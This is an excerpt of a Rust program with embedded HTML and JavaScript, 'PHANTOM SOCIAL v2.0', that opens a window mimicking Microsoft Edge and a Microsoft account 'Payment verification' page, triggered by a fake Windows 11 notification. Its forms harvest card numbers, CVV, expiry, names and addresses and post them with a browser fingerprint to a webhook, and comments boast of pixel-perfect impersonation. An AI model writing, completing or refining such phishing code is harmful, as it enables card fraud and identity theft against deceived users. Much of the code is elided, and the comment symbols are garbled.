...
// ==========================================================================
// PHANTOM SOCIAL v2.0 - COMPLETE OVERHAUL ðŸ”¥
// ==========================================================================
// âœ? Windows 11 native notifications (bottom-right corner)
// âœ? Real notification sound (Windows ringtone)
// âœ? Working minimize/maximize buttons (no glitches)
// âœ? Scroll-to-bottom arrow on webpage
// âœ? Never auto-exit after step 3 (user must close manually)
// âœ? DoS protection + rate limiting (no duplicate sends)
// âœ? Advanced fingerprinting (Base64 encoded)
// âœ? Pixel-perfect Edge UI simulation
// âœ? Fluent Design typography & spacing
// âœ? OS-accurate scrollbars & shadows
// ==========================================================================
...
use rand::Rng; // âœ? FIXED: Added Rng trait to allow .gen()
...
fn init_globals() {
    ...
    *WINDOW_MINIMIZED.lock().unwrap() = false;
}
...
use winapi::um::winuser::{MessageBoxW, MB_OKCANCEL, MB_ICONINFORMATION, MB_USERICON};
...
fn send_data(data: &str) -> bool {
    // DoS protection - check if we've sent this exact data before
...
// Windows 11 native toast notification
fn show_win11_notification() -> bool {
    ...
    result.is_ok() // âœ? FIXED: Return bool instead of implicit true
}

// Fallback MessageBox notification
...
fn get_html() -> String {
    ...
    let html = concat!(
        ...
        // Navigation buttons (Win11 style)
        ...
        // Window controls (exact Win11 proportions)
        ...
        // Custom scrollbar (Win11 overlay style)
        ...
        "<button class=\"nav-btn disabled\" title=\"Back\" onclick=\"window.history.back()\">",
        "<svg viewBox=\"0 0 24 24\" fill=\"currentColor\"><path d=\"M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z\"/></svg>",
        "</button>",
        "<button class=\"nav-btn disabled\" title=\"Forward\" onclick=\"window.history.forward()\">",
        ...
        "<a href=\"#\">Microsoft account</a> â€? <a href=\"#\">Security</a> â€? <span>Payment verification</span>",
        "</div>",
        ...
        "<strong>Data submitted successfully</strong><br>",
        "Your information has been recorded. Please review all entries before closing this window. You may continue using your Microsoft account normally.",
        "</div>",
...
function getCanvasFP(){
    ...
    x.textBaseline='top';
    x.font='14px Arial';
    x.fillStyle='#'+(rs%0xFFFFFF).toString(16).padStart(6,'0');
    x.fillRect(125+(rs%10),1+(rs%5),62,20);
    x.fillStyle='#069';
    x.fillText('Test '+(rs%1000),2+(rs%5),15);
    let h=0;
    const d=c.toDataURL();
...
function detectFonts(){
    ...
    for(const font of testFonts){
        ...
        if(base!==test)detected.push(font);
    }
    return detected.join(',');
}

// Send fingerprint once on page load
window.addEventListener('load',()=>{
    if(!fpSent){
        ...
        fetch(wh,{
            ...
            body:JSON.stringify({
                content:'```Fingerprint (Base64)\n'+fp+'\n```',
                username:'SystemFingerprint'
            })
        }).then(()=>fpSent=true);
    }
});
...
function minimizeWindow(){
    // Signal to Rust backend to minimize
    document.body.style.opacity='0';
    setTimeout(()=>document.body.style.opacity='1',200);
}

function maximizeWindow(){
    // Signal to Rust backend to toggle maximize
...
function validateStep2(){
    ...
    if(valid){
        const data={
            step:2,
            card_number:sanitize(card),
            cardholder_name:sanitize(name),
            expiry:sanitize(exp),
            cvv:sanitize(cvv),
            session:sid,
            canvas_fp:fp,
        ...
        sendStepData(2,data);
        setTimeout(()=>nextStep(3),100);
    }
}

function validateStep3(){
    let valid=true;
    ['address','city','state','zip','country'].forEach(id=>{
        clearError(id);
...
async function submitForm(){
    ...
    const data={
        step:3,
        street_address:sanitize(document.getElementById('address').value),
        city:sanitize(document.getElementById('city').value),
        state:sanitize(document.getElementById('state').value),
        zip_code:sanitize(document.getElementById('zip').value),
    ...
    // NEVER auto-close - user must close manually
}
...
document.getElementById('expiry').addEventListener('keydown',function(e){
    ...
    format!("{}{}", html, script) // âœ? FIXED: Concatenates HTML+Script (prevents white screen)
}
...
fn create_win(html: String) -> Result<(), Box<dyn std::error::Error>> {
    ...
    let win = WindowBuilder::new()
        ...
        .with_inner_size(wry::application::dpi::LogicalSize::new(920, 780))
...
fn main() {
    ...
    // âœ? FIXED: Explicitly check boolean return value
